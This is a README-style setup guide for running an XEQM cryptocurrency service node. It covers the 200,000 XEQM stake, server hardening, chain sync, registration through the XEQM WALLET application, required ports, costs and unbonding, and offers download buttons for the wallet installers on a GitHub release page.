![XEQM WALLET](assets/banner-article.png)

# How to set up an XEQM service node

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows" /> | Windows 10 or 11, 64-bit | [`XEQM-GUI-2.3.6-win.exe`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe) |
| <img src="https://img.shields.io/badge/macOS-1371E6?style=flat-square&logo=apple&logoColor=white" alt="macOS" /> | macOS, Apple Silicon | [`XEQM-GUI-2.3.6-mac.dmg`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg) |
| <img src="https://img.shields.io/badge/Linux-1371E6?style=flat-square&logo=linux&logoColor=white" alt="Linux" /> | x64 Linux, AppImage | [`XEQM-GUI-2.3.6-linux.AppImage`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage) |

</div>


All versions and checksums are on the [XEQM WALLET release page](https://github.com/XEQMFoundation/XEQM-Wallet/releases/tag/v2.3.6).

Requirements follow the platforms the release ships assets for. No minimum OS build or disk figure is published for this tag.

> Only download from this GitHub release page.

Setting up an XEQM service node is a seven-step flow: acquire the stake, harden the operating system, install the binaries, sync the chain, generate the registration command on the node, submit the staking transaction from the wallet, and wait for validation. The order matters, because the registration command is produced by the machine that will run and signed by the wallet that holds the stake.

## Before you begin

Three things have to exist: 200,000 XEQM in a wallet you control, a machine that meets the hardware minimum, and a connection that can reach the documented ports. Without all three, the flow stops somewhere inconvenient.

Read the whole sequence first. Most failed attempts skip a step rather than misconfigure one, and knowing what comes next tells you which step you are actually on. [XEQM service node hardware](https://github.com/XEQMFoundation/account-guide/blob/main/xeqm-service-node-hardware-requirements.md) covers the machine.

## Step one: acquire the stake

The bond is 200,000 XEQM for a solo node. It stays in your wallet until the registration transaction is submitted, and it returns to that wallet on deregistration.

Keep the seed for that wallet written down and tested before you start. The stake is a large balance behind one seed, and the registration does not change that fact. [How to back up XEQM WALLET](https://github.com/XEQMFoundation/custody-and-protection/blob/main/how-to-back-up-xeqm-wallet.md) is the routine.

## Step two: harden the machine

A node is a public server. That means updates applied, an SSH key rather than a password, a firewall allowing only what the node needs, and nothing else running on the box.

Do this before the binaries go on. Retrofitting security around a running node means taking it down, and a node that is down is a node missing windows.

## Step three: install the binaries

The core provides the daemon, the RPC companion and the command-line wallet. Install them where the service unit expects, and confirm each runs and reports its version before going further.

A binary that runs but cannot write its data directory will fail later in a way that looks like a network problem. Check the directory permissions now. [XEQM daemon fails to start on Linux](https://github.com/XEQMFoundation/platform-setup/blob/main/xeqm-daemon-fails-to-start-linux.md) covers the startup failures.

## Step four: sync the chain

Start the daemon, let it sync, and wait for it to reach the tip. This is the long step: roughly 48 GB and hours, depending on the disk and the connection.

Do not register against a node that is still syncing. The registration command is generated from the node's own state, and a node that is behind cannot describe itself correctly. [Disk space for the XEQM chain](https://github.com/XEQMFoundation/platform-setup/blob/main/how-much-disk-for-xeqm-blockchain.md) covers the space.

## Step five: generate the registration command

On the node, run the preparation command that produces the registration data. It encodes the node's public information and the stake parameters, and it is the input the wallet needs.

Copy the output exactly. A truncated paste is the most common reason a registration transaction is rejected, and it looks like a wallet error rather than a copy error. If the node will not answer the preparation command at all, check that the daemon is running and that its RPC port is free before pasting anything.

## Step six: submit the staking transaction from the wallet

In XEQM WALLET, submit the registration with the prepared data. The wallet signs the transaction that locks the stake and announces the node.

Do this from the wallet that holds the 200,000 XEQM, on a machine you trust. The wallet is where service-node management lives, so there is no separate staking tool to install.

## Step seven: wait for validation

The network validates the registration before the node starts earning. That is a wait rather than an action, and the status is visible in the wallet and from the daemon.

If the node is rejected, the cause is usually the data rather than the stake: a wrong port, a stale sync, or a machine that was unreachable at the moment it was checked. [Why an XEQM node gets deregistered](https://github.com/XEQMFoundation/account-guide/blob/main/why-was-my-xeqm-node-deregistered.md) covers the failure modes.

## The ports that have to be open

Peer-to-peer traffic uses 9230, RPC uses 9231 and quorumnet uses 9232. Inbound reachability on the peer port is what makes the node findable; the others matter for local management and for the quorum traffic a service node carries.

A hosted machine usually exposes them with a firewall rule. A home connection needs a forward and a stable address. [XEQM daemon firewall ports](https://github.com/XEQMFoundation/platform-setup/blob/main/xeqm-daemon-firewall-ports.md) is the detail.

## What the wallet shows once it is registered

Service-node management lives in the wallet, so the node's status is one of its screens rather than a separate dashboard. Registration, status and the staking transaction all belong to the same application.

That is convenient and worth understanding: the wallet is a window onto the node, and the node is the thing doing the work. Closing the wallet does not stop the node.

## Keeping the two machines straight

Many operators run the node on a host and the wallet at home. The split is sound: the node holds no keys that can spend the bond, and the wallet holds the seed that can manage it.

Keep it that way. Copying the seed onto a public server turns a node compromise into a wallet compromise, which is a much worse day.

## When the registration will not go through

Check the order rather than the transaction. A node that was not synced when the command was generated, a port that is not reachable from outside, and a paste that lost a character account for most failures.

Then check the wallet: the stake has to be present and spendable, and the network has to be Mainnet. A registration attempted from a wallet on Testnet is a registration for a different chain.

## Running it unattended

A service unit that starts the daemon at boot, restarts it on failure, and logs somewhere you can read is the difference between a node and a process in a terminal.

Add a status check and an alert. The first time the node stops at three in the morning, the alert is the only thing that tells you before the window is missed. [Monitor XEQM node uptime](https://github.com/XEQMFoundation/account-guide/blob/main/monitor-xeqm-node-uptime.md) covers what to watch.

## What it costs to run

The bond is the visible number; the machine and its connection are the rest. A hosted instance at the recommended specification, a domain-free static address and a monitoring check make up a monthly bill.

That bill is fixed while the reward is variable, which is the arithmetic every operator should do before committing. No yield figure is published, and any scenario you build assumes a node count and a win rate that will move.

## If you want to stop

A voluntary exit carries a fourteen-day unbonding period, after which the stake returns to the originating wallet. Deregistration for missed uptime returns it too, with the rewards and the standing lost.

Set out the exit the way you set out the entry: the stake is not liquid on the day you decide. [XEQM unbonding after unstaking](https://github.com/XEQMFoundation/account-guide/blob/main/xeqm-unbonding-period-after-unstaking.md) covers the timeline.

## Frequently asked questions

### Do I need a separate staking tool?

No. Service-node management is part of XEQM WALLET, including the registration transaction.

### Can I register before the node has synced?

No. The registration data is generated from the node's own state, so a node that is behind produces the wrong input.

### Where does the stake go during registration?

It stays locked as a bond and returns to the originating wallet on deregistration.

### What happens if the node goes offline?

Missed uptime windows lead to deregistration, which costs rewards and standing rather than the principal.

---

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

## Related guides

- [How much XEQM runs a service node](https://github.com/XEQMFoundation/account-guide/blob/main/how-much-xeqm-to-run-a-service-node.md)
- [Staking XEQM with less than 200K](https://github.com/XEQMFoundation/account-guide/blob/main/can-i-stake-xeqm-with-less.md)
- [XEQM service node hardware](https://github.com/XEQMFoundation/account-guide/blob/main/xeqm-service-node-hardware-requirements.md)
